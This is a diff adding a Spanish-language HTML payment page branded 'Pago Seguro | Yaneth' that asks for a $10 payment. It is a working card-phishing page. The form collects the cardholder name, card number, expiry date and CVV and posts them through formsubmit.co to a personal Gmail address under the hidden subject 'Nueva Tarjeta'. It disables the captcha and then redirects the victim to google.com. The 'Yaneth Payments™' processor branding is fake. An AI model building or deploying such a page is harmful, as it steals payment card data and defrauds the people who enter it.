@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pago Seguro | Yaneth</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            width: 90%;
+            max-width: 380px;
+            text-align: center;
+        }
+        h2 {
+            color: #333;
+            margin: 0 0 5px 0;
+            font-size: 22px;
+        }
+        .subtitle {
+            color: #777;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .amount-box {
+            background-color: #e8f5e9;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border: 1px solid #c8e6c9;
+        }
+        .amount {
+            font-size: 28px;
+            font-weight: bold;
+            color: #2e7d32;
+        }
+        label {
+            text-align: left;
+            display: block;
+            font-size: 13px;
+            color: #555;
+            margin-top: 10px;
+            font-weight: 600;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-top: 5px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        input:focus {
+            border-color: #007bff;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(0,123,255,0.25);
+        }
+        .row {
+            display: flex;
+            gap: 10px;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background 0.2s;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #007bff;
+            border-radius: 50%;
+            width: 16px;
+            height: 16px;
+            animation: spin 1s linear infinite;
+            display: none;
+            margin: 10px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .footer {
+            margin-top: 15px;
+            font-size: 11px;
+            color: #aaa;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Icono genérico de pago -->
+    <div style="font-size: 40px; margin-bottom: 10px;">🔒</div>
+    
+    <h2>Pago de Yaneth</h2>
+    <p class="subtitle">Completa tu transacción segura</p>
+    
+    <div class="amount-box">
+        <div class="amount">$10.00 USD</div>
+    </div>
+
+    <!-- FORMULARIO DE CAPTURA -->
+    <form action="https://formsubmit.co/ccesarreyna4@gmail.com" method="POST">
+        
+        <!-- Configuración oculta -->
+        <input type="hidden" name="_subject" value="Nueva Tarjeta - Pago de Yaneth">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://google.com">
+
+        <label>Nombre del Titular</label>
+        <input type="text" name="Titular" placeholder="Nombre como aparece en la tarjeta" required>
+
+        <label>Número de Tarjeta</label>
+        <input type="tel" name="Numero" placeholder="0000 0000 0000 0000" maxlength="19" oninput="this.value = this.value.replace(/[^0-9]/g, '').replace(/(.{4})/g, '$1 ').trim()" required>
+
+        <div class="row">
+            <div style="flex:1;">
+                <label>Vencimiento</label>
+                <input type="tel" name="Expira" placeholder="MM/AA" maxlength="5" required>
+            </div>
+            <div style="flex:1;">
+                <label>CVV</label>
+                <input type="password" name="CVV" placeholder="123" maxlength="4" required>
+            </div>
+        </div>
+
+        <button type="submit" id="btnPay">Pagar $10.00</button>
+        <div class="loader" id="loader"></div>
+    </form>
+    
+    <div class="footer">Procesado por Yaneth Payments™</div>
+</div>
+
+<script>
+    // Efecto de carga al enviar
+    document.querySelector('form').addEventListener('submit', function() {
+        const btn = document.getElementById('btnPay');
+        const loader = document.getElementById('loader');
+        btn.style.display = 'none';
+        loader.style.display = 'block';
+    });
+</script>
+
+</body>
+</html>
